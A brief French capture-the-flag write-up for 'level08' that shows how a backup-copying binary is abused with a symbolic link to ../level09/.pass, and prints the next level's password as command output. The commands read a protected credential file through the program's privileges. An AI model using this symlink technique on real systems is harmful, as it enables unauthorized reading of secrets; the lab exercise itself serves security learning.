# level08

En lisant le binaire, on voit que le programme fait une copie d'un fichier donné en paramètre dans son sous-dossier `./backups/`

On aimerait avoir un lien symbolique vers le password du level suivant

On peut !
```bash
chmod 777 .
ln -s ../level09/.pass coucou
./level08 ./coucou
cat ./backups/coucou
# fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
